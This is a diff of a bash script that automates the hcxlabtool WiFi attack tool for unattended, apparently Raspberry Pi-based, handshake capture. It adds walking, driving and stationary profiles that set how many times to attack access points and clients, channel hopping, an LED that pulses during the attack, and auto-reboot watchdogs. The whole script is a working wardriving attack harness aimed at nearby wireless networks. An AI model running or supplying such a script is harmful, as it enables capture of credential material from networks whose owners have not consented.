@@ -1,24 +1,76 @@
 #!/usr/bin/env bash
 
-log=/root/autohcxlab.log
+# ############################################ #
+# **************** CONFIG ******************** #
+stationary=			# leave empty
 capdir=/root/$(date +'%m-%d')/caps
-iface=$(ls -1 /sys/class/net | grep ^wl)
-bpf=/root/protect.bpf
-ssidlst=/root/essid.list
-chans=13,1,6,11,2,1,6,11,3,1,6,11,4,1,6,11,5,1,6,11,7,1,6,11,8,1,6,11,9,1,6,11,10,1,6,1,12,1,6,11
+bpf=/root/0wn.bpf
+logfile=/root/autohcxlab.log
+ssidlst=/root/standard.essidliste
 
-if ls -1 /sys/class/net | grep -q ^wl; then
+# ************* walking speed ****************
+attempts='--attemptapmax=1000 --attemptclientmax=50'
+chans='-c 1a,6a,11a,2a,1a,6a,11a,13a,1a,6a,11a,3a,1a,6a,11a,12a,1a,6a,11a,4a,1a,6a,11a,10a,1a,6a,11a,5a,1a,6a,11a,9a,1a,6a,11a,7a,1a,6a,11a,8a'
+staytime=
+# ********************************************
 
-	echo "$(date "+%m/%d %H:%M")    Autohcxlab started" |tee -a $log
-	mkdir -p $capdir
-	cd $capdir || echo "Couldn't cd into $capdir, using $(pwd)"
-	hcxlabgetmallwcpr -i $iface --onsigterm=exit --bpfc=$bpf --essidlist=$ssidlst --essidmax=30 --m2attempt=4 -c $chans
-# 	hcxlabgetm2wcpr -i $iface --onsigterm=exit --bpfc=$bpf --essidlist=$ssidlst --essidmax=30 --m2attempt=4 -c $chans
-	echo "$(date "+%m/%d %H:%M")	Autohcxlab stopped" |tee -a $log
-	ls -1sh $capdir
+# # ************* driving speed ****************
+# attempts='--attemptapmax=10 --attemptclientmax=4'
+# chans=				# leave empty
+# staytime=
+# # ********************************************
 
-else
+# # *********** stationary (home) **************
+# stationary=true			# disable ethernet check
+# attempts='--attemptclientmax=2'	# prevent attacking clients (in BPF) probing multiple APs
+# chans='-c 1a,3a,6a,5a,2a,7a,4a'	# depends on the channel of your AP (11 in this case)
+# staytime='-t 120'			# increasing stay time to 2mins
+# # ********************************************
+# ############################################## #
 
-	echo "$(date "+%m/%d %H:%M")	Couldn't find wireless interface, terminating!" |tee -a $log
-	exit 1
+exec &> >(tee -a $logfile)
+trap trapfunc SIGINT SIGTERM
+iw reg set DE > /dev/null
+
+sleep 10	# otherwise ethernet connection isn't detected reliably
+
+check_ethernet()
+{
+	if [ "$(cat /sys/class/net/eth0/operstate)" == "up" ]; then
+	echo "[x]	Ethernet connected - Exiting!"
+	exit
+	fi
+}
+
+trapfunc()
+{
+	[ -z $blinkpid ] || kill $blinkpid
+	echo "$(date "+%m/%d %H:%M")    autohcxlab stopped"
+	exit 0
+}
+
+#	prevent accidental attacks
+[ -n "$stationary" ] || check_ethernet
+
+echo '*===========================================================================*'
+echo "$(date "+%m/%d %H:%M")    autohcxlab started"
+echo 'Checking Iface'
+
+# 	looping until iface is found
+if ! ls -1 /sys/class/net | grep -q ^wl; then
+	echo "Looping until iface is found..."
+	until ls -1 /sys/class/net | grep -q ^wl
+	do
+		sleep 10
+	done
 fi
+
+echo 'iface found, starting attack!'
+mkdir -p $capdir
+cd $capdir || echo "Couldn't cd into $capdir, using $(pwd)"
+
+gpio blink 7 & 		# 	Pulse LED to indicate attack
+blinkpid=$!
+hcxlabtool --bpf=$bpf --watchdog=30 --onwatchdog=reboot --onerror=reboot --errormax=20 --essidlist=$ssidlst $attempts $chans $staytime
+
+[ -z $blinkpid ] || kill $blinkpid
